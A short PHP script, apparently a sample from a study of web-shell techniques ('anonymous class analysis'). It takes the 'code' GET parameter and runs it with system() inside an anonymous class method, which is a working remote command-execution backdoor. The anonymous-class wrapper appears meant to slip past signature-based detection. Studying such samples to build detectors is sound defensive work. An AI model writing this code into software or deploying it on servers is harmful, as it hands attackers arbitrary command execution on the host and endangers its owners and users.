<?php
/* 
 * 匿名类分析
 */
$code = $_GET['code'];
$obj = new class{
    public function myexec($code){
        system($code);
    }
};
$obj->myexec($code);

